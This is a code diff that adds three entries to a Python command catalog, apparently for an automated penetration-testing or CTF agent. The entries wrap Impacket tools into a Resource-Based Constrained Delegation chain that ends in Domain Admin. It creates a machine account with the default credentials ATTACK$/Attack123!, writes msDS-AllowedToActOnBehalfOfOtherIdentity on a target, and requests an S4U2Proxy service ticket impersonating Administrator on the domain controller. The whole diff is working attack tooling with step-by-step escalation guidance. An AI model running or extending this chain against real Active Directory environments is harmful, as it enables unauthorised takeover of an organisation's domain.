@@ -376,6 +376,56 @@ CATALOG: list[CommandSpec] = [
                               "-dc-ip", _s(k["target"]), "-request", "-outputfile", "spns.txt"],
         install_hint="pipx install impacket.",
     ),
+    # ---- Resource-Based Constrained Delegation (RBCD) -> Domain Admin -------
+    CommandSpec(
+        name="add_computer",
+        description="Create a new AD computer account (needs MachineAccountQuota>0). "
+                    "Used as the controlled principal for an RBCD attack. Needs valid "
+                    "domain credentials. Default computer ATTACK$ / Attack123!.",
+        binary="impacket-addcomputer", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "computer_name": {"type": "string", "description": "New computer name without $ (default ATTACK)."},
+            "computer_pass": {"type": "string", "description": "Password for the new computer (default Attack123!)."}},
+            ["target", "domain", "username", "password"]),
+        build_args=lambda k: ["-computer-name", _s(k.get("computer_name", "ATTACK")) + "$",
+                              "-computer-pass", _s(k.get("computer_pass", "Attack123!")),
+                              "-dc-ip", _s(k["target"]),
+                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="rbcd",
+        description="Configure Resource-Based Constrained Delegation: grant a "
+                    "computer/account you control the right to act on behalf of "
+                    "others on a target (write msDS-AllowedToActOnBehalfOfOtherIdentity). "
+                    "Needs creds for a principal with write over the target computer.",
+        binary="impacket-rbcd", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "delegate_from": {"type": "string", "description": "Account you control, e.g. ATTACK$."},
+            "delegate_to": {"type": "string", "description": "Target computer, e.g. DC01$."}},
+            ["target", "domain", "username", "password", "delegate_from", "delegate_to"]),
+        build_args=lambda k: ["-delegate-from", _s(k["delegate_from"]),
+                              "-delegate-to", _s(k["delegate_to"]), "-action", "write",
+                              "-dc-ip", _s(k["target"]),
+                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
+        name="get_st",
+        description="Request a service ticket impersonating a user via S4U2Proxy "
+                    "(after RBCD/constrained delegation). Saves a .ccache; set "
+                    "KRB5CCNAME to it and use -k with impacket/nxc. E.g. impersonate "
+                    "Administrator for cifs/DC01 to get admin on the DC.",
+        binary="impacket-getST", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "spn": {"type": "string", "description": "Target SPN, e.g. cifs/DC01.ctf.local."},
+            "impersonate": {"type": "string", "description": "User to impersonate, e.g. Administrator."}},
+            ["target", "domain", "username", "password", "spn", "impersonate"]),
+        build_args=lambda k: ["-spn", _s(k["spn"]), "-impersonate", _s(k["impersonate"]),
+                              "-dc-ip", _s(k["target"]),
+                              f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
+        install_hint="pipx install impacket.",
+    ),
     CommandSpec(
         name="certipy_find",
         description="Enumerate Active Directory Certificate Services (AD CS): "
